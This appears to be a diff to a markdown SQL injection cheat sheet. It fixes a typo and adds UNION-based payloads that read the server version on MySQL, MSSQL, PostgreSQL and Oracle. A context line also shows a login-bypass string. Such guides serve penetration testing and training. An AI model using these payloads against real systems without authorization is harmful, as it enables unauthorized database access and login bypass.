@@ -32,6 +32,28 @@ admin' or '1'='1
 
 ###  SQL Command Injection
 
-After stuffing the input fields you should either obtain access to the system as admin or the first user in the database. If not, you might've recieved a success message or something like that telling you that the SQL server accepted your input. In this case, try these common injections:
+After stuffing the input fields you should either obtain access to the system as admin or the first user in the database. If not, you might've received a success message or something like that telling you that the SQL server accepted your input. In this case, try these common injections:
+
+#### MySQL
 
 ```sql
+' UNION SELECT 1, VERSION(), 3-- 
+```
+
+#### MSSQL
+
+```sql
+' UNION ALL SELECT @@VERSION, NULL--
+```
+
+#### PostgreSQL
+
+```sql
+' UNION SELECT VERSION(), NULL-- 
+```
+
+#### Oracle SQL
+
+```sql
+' UNION ALL SELECT banner, NULL FROM v$version-- 
+```
